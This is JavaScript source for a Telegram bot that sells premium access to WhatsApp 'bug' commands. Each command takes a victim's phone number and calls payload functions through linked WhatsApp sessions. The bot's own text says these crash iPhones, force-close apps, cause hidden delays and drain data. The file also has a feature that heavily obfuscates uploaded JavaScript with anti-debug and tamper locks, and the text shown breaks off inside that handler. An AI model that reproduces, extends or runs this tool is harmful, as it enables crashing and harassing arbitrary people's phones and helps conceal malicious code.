//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/51xw9q.jpg",
        "https://files.catbox.moe/6tqcb0.jpg",
            "https://files.catbox.moe/asxy34.jpg",
                "https://files.catbox.moe/simsul.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown 
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}
// Function Bug
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ~ Enc Xopwn Confugurasi
const getVexxuzzZObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `ᨶꪖꪶᨶꫀƙꪖꪹỉᨶ和కỉꪊకỉꪊ无与伦比的帅气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};


//Conslole Log Chat Id
const log = (message, error = null) => {
    const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
    const prefix = `\x1b[36m[ VexxuzzZ ]\x1b[0m`;
    const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
    const msgStyle = `\x1b[32m${message}\x1b[0m`;
    console.log(`${prefix} ${timeStyle} ${msgStyle}`);
    if (error) {
        const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
        console.error(`${prefix} ${timeStyle} ${errorStyle}`);
        if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
    }
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_©VexxuzzZ",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}


// [ BUG FUNCTION ]


function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


/////---------------[sleep function]------_-_
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています ( 🫟 ).</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner", url: "https://t.me/BangZyur" }],
      ]
    }
  });
}

  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>

<blockquote>( 🫟 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
<b>⬡ Author : VexxuzzZ?</b>
<b>⬡ Version : 1.0.0</b>
<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
<b>⬡ Framework : Telegraf</b>
<b>⬡ Library : Javascript</b>
<b>⬡ PRIVATE SCRIPT</b>
</blockquote>
<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "ZyuroXz ☇ Qwerty", callback_data: "bugmenu" }, 
        { text: "Thanks ☇ Too", callback_data: "thanksto" }],
        [{ text: "ZyuroXz ☇ Crushy", callback_data: "ownermenu" }],
        [{ text: "ZyuroXz ☇ Developer", url: "https://t.me/BangZyur" }, 
        { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
      ]
    }
  });
});

bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = `<blockquote><b>( ! ) - ZyuroXz Virus</b>
<b>𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚎𝚔𝚜𝚙𝚕𝚘𝚒𝚝 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.</b>

<b>▢ /ZyuRtz ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Delay Hard</b>

<b>▢ /ZyuRNovaXz ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Ber efek delay invisible ( nyedot kuota hard )</b>

<b>▢ /ZyuRIphong ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Invisible ios hard</b>

<b>▢ /ZyuRForce ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Forclose ios hard</b>

<b>▢ /secretjir ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Menghapus bug yg sudah terkirim</b>

<b>-# ( ! ) Note :</b>
<b>Jangan asal mengirim virus ke orang yg tidak bersalah kalo tidak mau ber akibat fatall!!</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "ownermenu") {
    newCaption = `<blockquote><b>( ! ) - ZyuroXz Akses</b>
</blockquote>
<b>▢ /addprem id ☇ days</b>
<b>╰➤ Menambahkan akses pada user</b>

<b>▢ /delprem id</b>
<b>╰➤ Menghapus akses pada user</b>

<b>▢ /addadmin id</b>
<b>╰➤ Menambahkan akses admin pada user</b>

<b>▢ /deladmin id</b>
<b>╰➤ Menghapus akses admin pada use</b>

<b>▢ /listprem</b>
<b>╰➤ Melihat list premium user yang ada</b>

<b>▢ /addsender  ☇ Number</b>
<b>╰➤ Menambah Sender WhatsApp</b>

<blockquote><b>( # ) Note:</b>
<b>Baca dengan teliti Jangan asal ngetik untuk mendapat kan akses</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "thanksto") {
    newCaption = `<blockquote><b>( ! ) - Thanks Too</b>

<b>▢ VexxuzzZ ( Developer )</b>
<b>▢ Udin ( Best Friend )</b>
<b>▢ Abdul ( Best Friend )</b>
<b>▢ Xky ( My Owner )</b>
<b>▢ Lez ( My Teacher Js)</b>
<b>▢ All Partner ZyuroXz </b>
<b>▢ All Pengguna Sc </b>

<b>tqto</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "mainmenu") {
    newCaption = `<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>

<blockquote>( 🫟 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
<b>⬡ Author : VexxuzzZ?</b>
<b>⬡ Version : 1.0.0</b>
<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
<b>⬡ Framework : Telegraf</b>
<b>⬡ Library : Javascript</b>
<b>⬡ PRIVATE SCRIPT</b>
</blockquote>
<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
`;
    newButtons = [
        [{ text: "ZyuroXz ☇ Qwerty", callback_data: "bugmenu" }, 
        { text: "Thanks ☇ Too", callback_data: "thanksto" }],
        [{ text: "ZyuroXz ☇ Crushy", callback_data: "ownermenu" }],
        [{ text: "ZyuroXz ☇ Dev", url: "https://t.me/BangZyur" }, 
        { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
    ];
  }

  bot.editMessageMedia(
    {
      type: "photo",
      media: newImage,
      caption: newCaption,
      parse_mode: "HTML"
    },
    { chat_id: chatId, message_id: messageId }
  ).then(() => {
    bot.editMessageReplyMarkup(
      { inline_keyboard: newButtons },
      { chat_id: chatId, message_id: messageId }
    );
  }).catch((err) => {
    console.error("Error editing message:", err);
  });
});


//=======CASE BUG=========//

bot.onText(/\/ZyuRtz (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await bugwhatsapp(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ZyuRForce (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ZyuRNovaXz (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await pungtion(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/ZyuRIphong (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug ini work di semua device dan berlangsung lama
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug ini work di semua device dan berlangsung lama
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Xvcrash(sessions.values().next().value, jid);
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// Enc Fiture

bot.onText(/\/encvexxuzzz/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id.toString();

    // Cek Premium User
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
            parse_mode: "MarkdownV2",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
                    [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
                ]
            }
        });
    }

    // Cek apakah balas pesan dengan file
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/encvexxuzzz`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `vexxuzzz-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

